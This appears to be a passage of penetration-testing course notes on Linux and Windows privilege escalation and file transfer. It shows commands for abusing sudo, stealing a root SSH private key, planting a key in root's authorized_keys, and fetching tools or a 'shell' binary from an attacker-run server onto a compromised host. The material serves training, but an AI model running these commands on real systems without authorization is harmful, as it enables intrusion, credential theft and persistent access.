Note: These scripts will run many commands known for identifying vulnerabilities and create a lot of "noise" that may trigger anti-virus software or security monitoring software that looks for these types of events. This may prevent the scripts from running or even trigger an alarm that the system has been compromised. In some instances, we may want to do a manual enumeration instead of running scripts.

Let us take an example of running the Linux script from `PEASS` called `LinPEAS`:

```shell-session
TomasFerreira@htb[/htb]$ ./linpeas.sh
...SNIP...

```



### Kernel Exploits

Whenever we encounter a server running an old operating system, we should start by looking for potential kernel vulnerabilities that may exist.

For example, the above script showed us the Linux version to be `3.9.0-73-generic`. If we Google exploits for this version or use `searchsploit`, we would find a `CVE-2016-5195`, otherwise known as `DirtyCow`. We can search for and download the [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs) exploit and run it on the server to gain root access.

The same concept also applies to Windows, as there are many vulnerabilities in unpatched/older versions of Windows, with various vulnerabilities that can be used for privilege escalation.

<mark style="color:purple;">We should keep in mind that kernel exploits can cause system instability, and we should take great care before running them on production systems. It is best to try them in a lab environment and only run them on production systems with explicit approval and coordination with our client.</mark>



### Vulnerable Software

Another thing we should look for is installed software. For example, we can use the `dpkg -l` command on Linux or look at `C:\Program Files` in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.



### User Privileges

Another critical aspect to look for after gaining access to a server is the privileges available to the user we have access to.

&#x20;Suppose we are allowed to run specific commands as root (or as another user). In that case, we may be able to escalate our privileges to root/system users or gain access as a different user. Below are some common ways to exploit certain user privileges:

1. Sudo
2. SUID
3. Windows Token Privileges

The `sudo` command in Linux allows a user to execute commands as a different user. It is usually used to allow lower privileged users to execute commands as root without giving them access to the root user.

We can check what `sudo` privileges we have with the `sudo -l` command:

```shell-session
TomasFerreira@htb[/htb]$ sudo -l

[sudo] password for user1:
...SNIP...

User user1 may run the following commands on ExampleServer:
    (ALL : ALL) ALL
```

The above output says that we can run all commands with `sudo`, which gives us complete access, and we can use the `su` command with `sudo` to switch to the root user:

```shell-session
TomasFerreira@htb[/htb]$ sudo su -

[sudo] password for user1:
whoami
root
```

The above command requires a password to run any commands with `sudo`. There are certain occasions where we may be allowed to execute certain applications, or all applications, without having to provide a password:

```shell-session
TomasFerreira@htb[/htb]$ sudo -l

    (user : user) NOPASSWD: /bin/echo
```

The `NOPASSWD` entry shows that the `/bin/echo` command can be executed without a password.

&#x20;As it says `user`, we can run `sudo` as that user and not as root. To do so, we can specify the user with `-u user`:

```shell-session
TomasFerreira@htb[/htb]$ sudo -u user /bin/echo Hello World!

    Hello World!
```

Once we find a particular application we can run with `sudo`, we can look for ways to exploit it to get a shell as the root user. [GTFOBins](https://gtfobins.github.io/) contains a list of commands and how they can be exploited through `sudo`.

We can search for the application we have `sudo` privilege over, and if it exists, it may tell us the exact command we should execute to gain root access using the `sudo` privilege we have.

[LOLBAS](https://lolbas-project.github.io) also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.



### Scheduled Tasks

In both Linux and Windows, there are methods to have scripts run at specific intervals to carry out a task. Some examples are having an anti-virus scan running every hour or a backup script that runs every 30 minutes. There are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:

1. Add new scheduled tasks/cron jobs
2. Trick them to execute a malicious software

The easiest way is to check if we are allowed to add new scheduled tasks. In Linux, a common form of maintaining scheduled tasks is through `Cron Jobs`. There are specific directories that we may be able to utilize to add new cron jobs if we have the `write` permissions over them. These include:

1. `/etc/crontab`
2. `/etc/cron.d`
3. `/var/spool/cron/crontabs/root`



### Exposed Credentials

Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us, as below:

```shell-session
...SNIP...
[+] Searching passwords in config PHP files
[+] Finding passwords inside logs (limit 70)
...SNIP...
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
```

As we can see, the database password '`password123`' is exposed, which would allow us to log in to the local `mysql` databases and look for interesting information. We may also check for `Password Reuse`, as the system user may have used their password for the databases, which may allow us to use the same password to switch to that user, as follows:

```shell-session
TomasFerreira@htb[/htb]$ su -

Password: password123
whoami

root
```



### SSH Keys

If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:

```shell-session
TomasFerreira@htb[/htb]$ vim id_rsa
TomasFerreira@htb[/htb]$ chmod 600 id_rsa
TomasFerreira@htb[/htb]$ ssh root@10.10.10.10 -i id_rsa

root@10.10.10.10#
```

If we find ourselves with write access to a users`/.ssh/` directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with `ssh-keygen` and the `-f` flag to specify the output file:

```shell-session
TomasFerreira@htb[/htb]$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+
```



This will give us two files: `key` (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine. Let us copy `key.pub`, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:

```shell-session
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

```shell-session
TomasFerreira@htb[/htb]$ ssh root@10.10.10.10 -i key

root@remotehost# 
```

As we can see, we can now ssh in as the user `root`. The [Linux Privilege Escalation](https://academy.hackthebox.com/module/details/51) and the [Windows Privilege Escalation](https://academy.hackthebox.com/module/details/67) modules go into more details on how to use each of these methods for Privilege Escalation, and many others as well.



## Transferring Files

### Using wget

One method is running a [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common\_questions/set\_up\_a\_local\_testing\_server) on our machine and then using `wget` or `cURL` to download the file on the remote host.

\
First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:

```shell-session
TomasFerreira@htb[/htb]$ cd /tmp
TomasFerreira@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:

```shell-session
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

Note that we used our IP `10.10.14.1` and the port our Python server runs on `8000`. If the remote server does not have `wget`, we can use `cURL` to download the file:

```shell-session
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

Note that we used the `-o` flag to specify the output file name.



### Using SCP

Another method to transfer files would be using `scp`, granted we have obtained ssh user credentials on the remote host. We can do so as follows:

```shell-session
TomasFerreira@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```



### Using Base64

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:

```shell-session
TomasFerreira@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:

```shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```



### Validating File Transfers

To validate the format of a file, we can run the [file](https://linux.die.net/man/1/file) command on it:

```shell-session
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

As we can see, when we run the `file` command on the `shell` file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run `md5sum` on it:

```shell-session
TomasFerreira@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

Now, we can go to the remote server and run the same command on the file we transferred:

```shell-session
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```
